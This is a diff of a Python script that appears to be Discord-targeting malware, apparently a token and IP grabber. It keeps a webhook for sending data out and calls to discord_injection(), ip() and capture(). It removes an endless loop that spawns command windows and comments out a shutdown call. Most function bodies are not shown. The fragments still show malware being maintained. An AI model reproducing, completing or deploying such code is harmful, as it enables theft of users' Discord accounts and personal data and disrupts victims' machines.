@@ -37,7 +37,7 @@ print(f""" {yellow}
 """)
 os.system("cls")
 
-webhook = "" # Ici faut placer ton webhook
+webhook = "" 
 
 def discord_injection():
     sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))
@@ -68,14 +68,10 @@ def dossier():
             os.mkdir(new_dossier)
         except Exception as e:
             print("Error", e)
-
-
-def cmd():
-    while True: 
         try:
             os.system("start cmd")
         except Exception as e:
-            print("Une erreur et survenue", e)
+            print("Error", e)
 
 
 def shutdown():
@@ -131,9 +127,8 @@ discord_injection()
 ip()
 dir()
 capture()
-cmd()
 dossier()
-shutdown()
+#shutdown()
 
 
 buffer = ""
